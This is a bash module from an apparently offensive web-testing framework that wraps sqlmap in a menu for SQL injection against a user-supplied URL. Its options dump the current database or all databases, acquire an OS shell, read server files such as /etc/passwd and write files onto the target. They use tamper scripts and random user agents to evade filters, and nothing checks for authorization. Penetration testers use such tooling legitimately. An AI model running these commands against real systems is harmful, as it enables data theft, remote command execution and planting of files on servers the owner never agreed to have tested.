#!/bin/bash
#
# SQLMap Module - SQL Injection Testing
# Part of PurpleSploit Web Testing Framework
#
# This module handles all sqlmap-related operations including:
# - Basic SQL injection scanning
# - POST data injection testing
# - Cookie-based injection testing
# - Custom header injection testing
# - Database enumeration and dumping
# - OS shell acquisition
# - File read/write operations on target server
# - Custom scan configurations
#
# Dependencies:
# - sqlmap (must be installed)
# - Global variables from plat02.sh (colors, run_command, show_menu)
#

handle_sqlmap() {
    while true; do
        subchoice=$(show_menu "sqlmap" "Select SQLMap Operation: ")
        [[ -z "$subchoice" || "$subchoice" == "Back" ]] && break

        case "$subchoice" in
            "Basic SQL Injection Scan")
                read -p "Target URL (e.g., http://example.com/page?id=1): " url
                echo -e "${CYAN}Running basic SQL injection scan${NC}"
                echo -e "${GREEN}Using defaults: --batch --random-agent --tamper=space2comment${NC}"
                run_command "sqlmap -u '$url' --batch --random-agent --tamper=space2comment --level=1 --risk=1"
                ;;
            "POST Data Injection")
                read -p "Target URL: " url
                read -p "POST data (e.g., username=admin&password=pass): " postdata
                echo -e "${CYAN}Testing POST parameters for SQL injection${NC}"
                run_command "sqlmap -u '$url' --data='$postdata' --batch --random-agent --tamper=space2comment"
                ;;
            "Cookie-based Injection")
                read -p "Target URL: " url
                read -p "Cookie string (e.g., session=abc123; user=admin): " cookie
                echo -e "${CYAN}Testing cookie for SQL injection${NC}"
                run_command "sqlmap -u '$url' --cookie='$cookie' --batch --random-agent --tamper=space2comment --level=2"
                ;;
            "Custom Headers Injection")
                read -p "Target URL: " url
                read -p "Header (e.g., X-Forwarded-For: 127.0.0.1): " header
                echo -e "${CYAN}Testing custom header for SQL injection${NC}"
                run_command "sqlmap -u '$url' --headers='$header' --batch --random-agent --tamper=space2comment"
                ;;
            "Dump Current Database")
                read -p "Target URL: " url
                echo -e "${CYAN}Dumping current database${NC}"
                run_command "sqlmap -u '$url' --batch --random-agent --tamper=space2comment --current-db --dump"
                ;;
            "Dump All Databases")
                read -p "Target URL: " url
                echo -e "${CYAN}Dumping all databases${NC}"
                echo -e "${YELLOW}Warning: This may take a while!${NC}"
                read -p "Continue? (y/n): " confirm
                if [[ "$confirm" == "y" ]]; then
                    run_command "sqlmap -u '$url' --batch --random-agent --tamper=space2comment --all --dump-all"
                fi
                ;;
            "Get OS Shell")
                read -p "Target URL: " url
                echo -e "${CYAN}Attempting to get OS shell${NC}"
                echo -e "${YELLOW}Requires stacked queries support${NC}"
                run_command "sqlmap -u '$url' --batch --random-agent --tamper=space2comment --os-shell"
                ;;
            "Read File from Server")
                read -p "Target URL: " url
                read -p "File to read (e.g., /etc/passwd): " file
                echo -e "${CYAN}Reading file from server${NC}"
                run_command "sqlmap -u '$url' --batch --random-agent --tamper=space2comment --file-read='$file'"
                ;;
            "Write File to Server")
                read -p "Target URL: " url
                read -p "Local file to upload: " local_file
                read -p "Remote destination path: " remote_path
                echo -e "${CYAN}Writing file to server${NC}"
                run_command "sqlmap -u '$url' --batch --random-agent --tamper=space2comment --file-write='$local_file' --file-dest='$remote_path'"
                ;;
            "Custom Scan")
                read -p "Full sqlmap command (without 'sqlmap'): " custom_cmd
                run_command "sqlmap $custom_cmd"
                ;;
        esac
    done
}

# Export function for use in main script
export -f handle_sqlmap
